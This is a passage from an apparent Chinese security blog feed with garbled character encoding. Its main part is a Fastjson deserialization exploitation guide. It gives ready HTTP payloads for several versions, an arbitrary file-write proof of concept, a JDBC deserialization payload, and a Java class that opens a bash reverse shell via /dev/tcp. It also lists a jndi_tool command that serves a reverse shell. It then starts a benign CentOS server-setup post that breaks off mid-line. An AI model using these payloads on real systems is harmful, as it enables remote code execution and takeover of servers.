class="line"><span class="comment">        &quot;dataSourceName&quot;:&quot;rmi://2.2.2.2:9999/Exploit&quot;,</span></span><br><span class="line"><span class="comment">        &quot;autoCommit&quot;:true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="0x04-å„ä¸ªç‰ˆæœ¬åˆ©ç”¨"><a href="#0x04-å„ä¸ªç‰ˆæœ¬åˆ©ç”¨" class="headerlink" title="0x04 å„ä¸ªç‰ˆæœ¬åˆ©ç”¨"></a>0x04 å„ä¸ªç‰ˆæœ¬åˆ©ç”¨</h1><h2 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson 1.2.24"></a>fastjson 1.2.24</h2><p>å¦‚æœå¼¹shell éœ€è¦å…ˆæ­å»º rmi æœåŠ¡å™¨</p><p>å°†<code>127.0.0.1</code> æ¢æˆrmiæœåŠ¡å™¨åœ°å€ <code>8653</code> ä¸ºrmi æœåŠ¡å™¨ç«¯å£</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>you-ip:port</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;b&quot;</span>:&#123;</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8653/Exp&quot;</span>,</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="json">    &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson 1.2.47"></a>fastjson 1.2.47</h2><p>å¦‚æœå¼¹shell éœ€è¦å…ˆæ­å»º rmi æœåŠ¡å™¨</p><p>å°†<code>127.0.0.1</code> æ¢æˆrmiæœåŠ¡å™¨åœ°å€ <code>8653</code> ä¸ºrmi æœåŠ¡å™¨ç«¯å£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: you-ip:port</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (compatible; MSIE <span class="number">9.0</span>; Windows NT <span class="number">6.1</span>; Win64; x64; Trident/<span class="number">5.0</span>)</span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Content-Length: <span class="number">158</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8653/Exp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjson burp æ’ä»¶</p><p><a href="https://github.com/zilong3033/fastjsonScan">https://github.com/zilong3033/fastjsonScan</a></p><h2 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson 1.2.68"></a>fastjson 1.2.68</h2><h3 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h3><p>åœ¨Fastjson&lt;=1.2.68çš„ç‰ˆæœ¬ä¸­ï¼Œé€šè¿‡æ–°çš„Gadgetsç»•è¿‡autoTypeå¼€å…³ï¼Œåœ¨autoTypeå…³é—­çš„æƒ…å†µä¸‹ä»ç„¶å¯ä»¥ç»•è¿‡é»‘ç™½åå•é˜²å¾¡æœºåˆ¶ï¼Œé€šè¿‡ååºåˆ—åŒ–æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç </p><p>Fastjsonçˆ†å‡ºçš„ç»•è¿‡æ–¹æ³•å¯ä»¥é€šæ€ 1.2.68 ä»¥ä¸‹æ‰€æœ‰ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fastjson &lt;= <span class="number">1.2</span><span class="number">.68</span></span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>ä»»æ„æ–‡ä»¶å†™å…¥POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,<span class="string">&quot;out&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,<span class="string">&quot;out&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,<span class="string">&quot;file&quot;</span>:<span class="string">&quot;/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/charsets.jar&quot;</span>,<span class="string">&quot;append&quot;</span>:<span class="keyword">false</span>&#125;,<span class="string">&quot;infl&quot;</span>:&#123;<span class="string">&quot;input&quot;</span>:<span class="string">&quot;xxx&quot;</span>&#125;,<span class="string">&quot;bufLen&quot;</span>:<span class="number">1048576</span>&#125;,<span class="string">&quot;protocolVersion&quot;</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.nio.charset.Charset&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;500&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>JDBCååºåˆ—åŒ–POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<span class="string">&quot;hostToConnectTo&quot;</span>:<span class="string">&quot;172.20.64.40&quot;</span>,<span class="string">&quot;portToConnectTo&quot;</span>:<span class="number">3306</span>,<span class="string">&quot;url&quot;</span>:<span class="string">&quot;jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="string">&quot;databaseToConnectTo&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;info&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Properties&quot;</span>,<span class="string">&quot;PORT&quot;</span>:<span class="string">&quot;3306&quot;</span>,<span class="string">&quot;statementInterceptors&quot;</span>:<span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="string">&quot;autoDeserialize&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn&quot;</span>,<span class="string">&quot;PORT.1&quot;</span>:<span class="string">&quot;3306&quot;</span>,<span class="string">&quot;HOST.1&quot;</span>:<span class="string">&quot;172.20.64.40&quot;</span>,<span class="string">&quot;NUM_HOSTS&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;HOST&quot;</span>:<span class="string">&quot;172.20.64.40&quot;</span>,<span class="string">&quot;DBNAME&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="0x05-Fastjsonä¸å‡ºç½‘åˆ©ç”¨"><a href="#0x05-Fastjsonä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="0x05 Fastjsonä¸å‡ºç½‘åˆ©ç”¨"></a>0x05 Fastjsonä¸å‡ºç½‘åˆ©ç”¨</h1><p><a href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></p><p>1.<strong>æœåŠ¡å™¨å‡ºç½‘</strong></p><p>ä½¿ç”¨<code>jndi</code>æ³¨å…¥-<code>ldap -</code>rmi</p><p>2.<strong>æœåŠ¡å™¨ä¸èƒ½å‡ºç½‘</strong></p><ul><li>ç›´æ¥æœ¬åœ°ååºåˆ—åŒ–</li><li><code>BasicDataSource</code>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)</li><li><code>TemplatesImpl</code>  ä¸å¸¸ç”¨</li></ul><h2 id="ååºåˆ—åŒ–-bytecodesç›´æ¥ååºåˆ—åŒ–Poc-TemplatesImpl"><a href="#ååºåˆ—åŒ–-bytecodesç›´æ¥ååºåˆ—åŒ–Poc-TemplatesImpl" class="headerlink" title="ååºåˆ—åŒ–-_bytecodesç›´æ¥ååºåˆ—åŒ–Poc  TemplatesImpl"></a><strong>ååºåˆ—åŒ–-_bytecodesç›´æ¥ååºåˆ—åŒ–Poc</strong>  <code>TemplatesImpl</code></h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.sun</span><span class="selector-class">.org</span><span class="selector-class">.apache</span><span class="selector-class">.xalan</span><span class="selector-class">.internal</span><span class="selector-class">.xsltc</span><span class="selector-class">.trax</span>.TemplatesImpl</span><br></pre></td></tr></table></figure><p>ç”±äºè§£æjsonéœ€è¦é¢å¤–æ·»åŠ å‚æ•°Featureï¼Œå› æ­¤å®é™…æƒ…å†µå¯èƒ½ä¸ä¼šé‡åˆ°ï¼Œè¿™é‡Œåªæ˜¯åšä¸ªè®°å½•ã€‚é¦–å…ˆéœ€è¦å‡†å¤‡ä¸€ä¸ªPocï¼š</p><p>åˆ›å»º<code>Poc.java</code> ä»£ç å¦‚ä¸‹ <code>exec</code> ä¸ºpayloadï¼Œä½¿ç”¨ä½ç‰ˆæœ¬Java æ‰§è¡Œæœ€å¥½æ˜¯jdk8 ä»¥ä¸‹çš„ï¼Œ<code>javac Poc.java</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Poc extends AbstractTranslet &#123;</span><br><span class="line">public Poc() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().<span class="built_in">exec</span>(new String[]&#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Poc t = new Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new String[] æ˜¯ä»¥æ•°ç»„çš„æ–¹å¼ä¼ é€ï¼Œèƒ½æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œå¦‚æœä¸åŠ ä¼šæŠ¥é”™ã€‚</p><p>åœ¨ä½¿ç”¨ pythonç”Ÿæˆå­—èŠ‚ç </p><p>python <a href="http://fast.py/">fast.py</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">fin = open(r<span class="string">&quot;Poc.class&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">fout = open(r<span class="string">&quot;en1.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">s = base64.encodestring(fin.read()).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">fout.write(s)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><p>å°†ç”Ÿæˆçš„å­—èŠ‚ç æ”¾å…¥<code> poc.class_base64</code></p><p>1.2.24 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;poc.class_base64&quot;</span>],<span class="string">&#x27;_name&#x27;</span>:<span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class="string">&quot;_outputProperties&quot;</span>:&#123;&#125;,<span class="string">&quot;_name&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>1.2.47 payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;a&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>&#125;,<span class="string">&quot;b&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;poc.class_base64&quot;</span>],<span class="string">&#x27;_name&#x27;</span>: <span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>: &#123;&#125;,<span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,<span class="string">&quot;_name&quot;</span>: <span class="string">&quot;b&quot;</span>,        <span class="string">&quot;_version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>: <span class="string">&quot;all&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><a href="#org-apache-tomcat-dbcp-dbcp2-BasicDataSource" class="headerlink" title="org.apache.tomcat.dbcp.dbcp2.BasicDataSource"></a>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</h2><p>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)</p><p>æ’ä»¶åœ°å€</p><p><a href="https://github.com/bigsizeme/fastjson-check">https://github.com/bigsizeme/fastjson-check</a></p><p>ä¸€é”®ç”Ÿæˆé“¾å­</p><p>çœ‹ä¸åˆ°typeç±»å‹ï¼Œè‡ªè¡Œå¾€å³æ‹‰ã€‚</p><p>å…ˆconfig é€‰æ‹©  ç„¶åGenerte Echo payload</p><p><img src="/2022/498480683/image.png" alt="img"></p><p><img src="/2022/498480683/image.png" alt="img"></p><p><a href="https://jishuin.proginn.com/p/763bfbd63f5d">https://jishuin.proginn.com/p/763bfbd63f5d</a></p><p><a href="https://cloud.tencent.com/developer/article/1785575">https://cloud.tencent.com/developer/article/1785575</a></p><p><a href="https://xz.aliyun.com/t/7104">https://xz.aliyun.com/t/7104</a></p><h1 id="0x06-ç»¼åˆåˆ©ç”¨è„šæœ¬"><a href="#0x06-ç»¼åˆåˆ©ç”¨è„šæœ¬" class="headerlink" title="0x06 ç»¼åˆåˆ©ç”¨è„šæœ¬"></a>0x06 ç»¼åˆåˆ©ç”¨è„šæœ¬</h1><p><a href="https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/jndi_tool.jar">https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/jndi_tool.jar</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 1.1.1.1 8888 <span class="string">&quot;bash=bash -i &gt;&amp;/dev/tcp/x.x.x.x/80 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure><p>å®˜ç½‘ <a href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></p><p>å‚è€ƒé“¾æ¥</p><p><a href="https://jishuin.proginn.com/p/763bfbd63f5d">https://jishuin.proginn.com/p/763bfbd63f5d</a>   Fastjsonä¸‰æ¡åˆ©ç”¨é“¾</p><p><a href="https://www.cnblogs.com/pickmea/p/15157189.html">https://www.cnblogs.com/pickmea/p/15157189.html</a></p><p><a href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg">https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg</a></p><p><a href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/">https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/</a></p><p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>]]></content>
    
    
    <summary type="html">Fastjson æ¦‚è¿°,æ¼æ´åˆ©ç”¨,ä¸å‡ºç½‘åˆ©ç”¨åˆé›†</summary>
    
    
    
    <category term="æ¼æ´åˆ©ç”¨" scheme="https://fz1lin.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Fastjson" scheme="https://fz1lin.com/tags/Fastjson/"/>
    
    <category term="Java" scheme="https://fz1lin.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>vps å¸¸ç”¨ç¯å¢ƒå®‰è£…</title>
    <link href="https://fz1lin.com/2022/2917416115/"/>
    <id>https://fz1lin.com/2022/2917416115/</id>
    <published>2022-03-31T11:14:11.000Z</published>
    <updated>2022-08-04T12:46:25.068Z</updated>
    
    <content type="html"><![CDATA[<p>ä¿®è®¢ç‰ˆæœ¬ v 2.0â€”å¢åŠ javaç¯å¢ƒç›¸å…³å†…å®¹ï¼Œä¼˜åŒ–Linux è¯­å¥ã€å¢åŠ python pip å®‰è£…</p><p>ä¿®è®¢ç‰ˆæœ¬ v 3.0 -å¢åŠ  MySQL å®‰è£…ï¼Œä¼˜åŒ–Linuxè¯­å¥å†…å®¹ã€‚</p><h2 id="å¿…çœ‹"><a href="#å¿…çœ‹" class="headerlink" title="å¿…çœ‹"></a>å¿…çœ‹</h2><p>æœ¬å®‰è£…ç³»ç»Ÿé€‚ç”¨äº centos 7 ç³»åˆ—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br><span class="line">centos 7</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰å®‰è£…ç¯å¢ƒåªæ ¹æ®ä¸ªäººéœ€è¦è¿›è¡Œå®‰è£…ï¼Œæ— éœ€å…¨éƒ¨å®‰è£…ï¼Œä¼šæŒç»­æ·»åŠ ï¼Œä¿®è®¢ ~~</p><p>source /etc/profile  ç¼–è¯‘ååªèƒ½åœ¨å½“å‰ç»ˆç«¯ç”Ÿæ•ˆï¼Œé‡æ–°å¼€å¯ä¸€ä¸ªä¸­æ–­åï¼Œè¯¥ç¯å¢ƒå˜é‡å°†å¤±æ•ˆã€‚è§£å†³åŠæ³•ï¼Œé‡å¯ <code>reboot</code>ã€å³å¯æ°¸ä¹…ç”Ÿæ•ˆ</p><h2 id="Linuxé…ç½®ssh"><a href="#Linuxé…ç½®ssh" class="headerlink" title="Linuxé…ç½®ssh"></a>Linuxé…ç½®ssh</h2><p>1.vncé…ç½®sshè¿æ¥</p><ul><li>æŒ‰ç…§è¦æ±‚è¿›è¡Œé…ç½®</li><li>è¿›è¡Œè¿æ¥</li></ul><p>2.sshè¿æ¥</p><ul><li>é…ç½®sshé…ç½®æ–‡ä»¶</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/ssh_config</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹sshé…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment"># Port 22 å»æ‰æ³¨é‡Š</span></span><br><span class="line">Port <span class="number">22</span></span><br><span class="line"><span class="comment">#------------------------åˆ†å‰²çº¿---------------------------</span></span><br><span class="line"><span class="comment">#PermitLocalCommand no #å»æ‰æ³¨é‡Šå¹¶æ”¹ä¸º</span></span><br><span class="line">PermitLocalCommand yes</span><br><span class="line">- é€€å‡ºä¿å­˜å³å¯</span><br></pre></td></tr></table></figure><p>3.è¿æ¥ssh</p><p>è¾“å…¥å¯†ç å’Œç”¨æˆ·å³å¯</p><h2 id="Yum-æº"><a href="#Yum-æº" class="headerlink" title="Yum æº"></a>Yum æº</h2><p>å›½å¤–çš„æœåŠ¡å¯å¿½ç•¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget</span><br><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d</span><br><span class="line">mv CentOS-Base.repo CentOS-Base.repo.bk</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">yum clean all &amp;&amp; yum makecache</span><br></pre></td></tr></table></figure><p>å…¶ä»–æº</p><p>æ¸…åæº <a href="https://mirrors.tuna.tsinghua.edu.cn/help/centos/">https://mirrors.tuna.tsinghua.edu.cn/help/centos/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç½‘æ˜“æº</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.<span class="built_in">help</span>/CentOS7-Base-163.repo</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸­ç§‘å¤§</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo <span class="string">&#x27;https://lug.ustc.edu.cn/wiki/_export/code/mirrors/help/centos?codeblock=3&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Linux-æœ€å°åŒ–å·¥å…·åº“"><a href="#Linux-æœ€å°åŒ–å·¥å…·åº“" class="headerlink" title="Linux æœ€å°åŒ–å·¥å…·åº“"></a>Linux æœ€å°åŒ–å·¥å…·åº“</h2><p>å› ä¸ºæ˜¯æœ€å°åŒ–å®‰è£…ï¼Œæ‰€ä»¥å¥½å¤šå¸¸ç”¨å·¥å…·éœ€è¦è‡ªè¡Œå®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y vim lrzsz gcc gcc-c++ net-tools wget automake cmake gzip bzip2 zip unzip kernel kernel-devel kernel-headers git-all screen </span><br></pre></td></tr></table></figure><h2 id="Java-ç¯å¢ƒ"><a href="#Java-ç¯å¢ƒ" class="headerlink" title="Java ç¯å¢ƒ"></a>Java ç¯å¢ƒ</h2><p>å®‰è£…å¤šä¸ªJavaç‰ˆæœ¬æ˜¯å¯ä»¥åˆ‡æ¢çš„ï¼Œæ²¡æœ‰æµ‹è¯•åœ¨è¿è¡Œç¨‹åºï¼Œåˆ‡æ¢ç‰ˆæœ¬ï¼Œä¼šä¸ä¼šå‡ºç°æ•…éšœï¼Œæœ€å¥½æµ‹è¯•ä¸€ä¸‹ï¼Œç›®å‰æœ¬åœ°æµ‹è¯•æœåŠ¡æœªå‡ºç°æ•…éšœï¼Œæ²¡æœ‰è·‘æœåŠ¡ï¼Œè‡ªæµ‹å§ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œå®‰è£…</p><p><img src="/2022/2917416115/image.png" alt="img"></p><h3 id="Java11"><a href="#Java11" class="headerlink" title="Java11"></a>Java11</h3><p>1.å®‰è£…javaç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.java.net/openjdk/jdk11/ri/openjdk-11+28_linux-x64_bin.tar.gz</span><br><span class="line">mkdir /opt/java</span><br><span class="line">tar zxvf openjdk-11+28_linux-x64_bin.tar.gz -C /opt/java</span><br><span class="line">rm -rf openjdk-11+28_linux-x64_bin.tar.gz</span><br><span class="line"></span><br><span class="line">vim  /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># java 11</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/java/jdk-11</span><br><span class="line"><span class="built_in">export</span> 